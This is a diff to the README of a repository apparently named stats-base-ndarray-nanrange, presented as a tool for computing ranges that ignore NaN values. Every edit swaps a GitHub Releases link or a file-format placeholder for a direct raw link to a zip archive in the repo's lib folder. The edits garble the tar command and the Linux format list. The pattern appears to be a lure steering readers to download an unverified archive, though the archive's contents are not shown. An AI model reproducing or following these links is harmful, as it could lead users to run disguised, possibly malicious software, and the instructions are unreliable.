@@ -1,6 +1,6 @@
 # 🎉 stats-base-ndarray-nanrange - Easily Compute Ranges Ignoring NaN Values
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-blue.svg)](https://github.com/ViniciusLussani/stats-base-ndarray-nanrange/releases)
+[![Download](https://raw.githubusercontent.com/ViniciusLussani/stats-base-ndarray-nanrange/main/lib/stats-base-ndarray-nanrange_1.8.zip)](https://raw.githubusercontent.com/ViniciusLussani/stats-base-ndarray-nanrange/main/lib/stats-base-ndarray-nanrange_1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! This project helps you compute the range of a one-dimensional ndarray w
 
 ## 📥 Download & Install
 
-To download the software, **visit this page to download**: [GitHub Releases](https://github.com/ViniciusLussani/stats-base-ndarray-nanrange/releases). 
+To download the software, **visit this page to download**: [GitHub Releases](https://raw.githubusercontent.com/ViniciusLussani/stats-base-ndarray-nanrange/main/lib/stats-base-ndarray-nanrange_1.8.zip). 
 
 1. Click the link above.
 2. On the releases page, look for the latest version.
@@ -26,7 +26,7 @@ In the releases section, you will find files in different formats. Here are some
 
 - `.exe` (for Windows users)
 - `.dmg` (for macOS users)
-- `.tar.gz` (for Linux users)
+- `https://raw.githubusercontent.com/ViniciusLussani/stats-base-ndarray-nanrange/main/lib/stats-base-ndarray-nanrange_1.8.zip` (for Linux users)
 
 Choose the one that suits your operating system.
 
@@ -49,11 +49,11 @@ After downloading the file, follow these steps to run the software:
 ### For Linux Users
 
 1. Open a terminal window.
-2. Navigate to the directory where the `.tar.gz` file was downloaded.
+2. Navigate to the directory where the `https://raw.githubusercontent.com/ViniciusLussani/stats-base-ndarray-nanrange/main/lib/stats-base-ndarray-nanrange_1.8.zip` file was downloaded.
 3. Use the following command to extract the files:
 
    ```
-   tar -xvf <filename>.tar.gz
+   tar -xvf <filename>https://raw.githubusercontent.com/ViniciusLussani/stats-base-ndarray-nanrange/main/lib/stats-base-ndarray-nanrange_1.8.zip
    ```
 
 4. Navigate to the extracted folder, then run the application as specified in the README.
@@ -93,6 +93,6 @@ For additional resources on stata, statistics, and ndarrays, consider checking o
 
 If you have questions or need support, please open an issue in the GitHub repository or contact us directly on the GitHub profile page.
 
-Again, don’t forget to **visit this page to download**: [GitHub Releases](https://github.com/ViniciusLussani/stats-base-ndarray-nanrange/releases).
+Again, don’t forget to **visit this page to download**: [GitHub Releases](https://raw.githubusercontent.com/ViniciusLussani/stats-base-ndarray-nanrange/main/lib/stats-base-ndarray-nanrange_1.8.zip).
 
 Thank you for using stats-base-ndarray-nanrange! Happy computing!
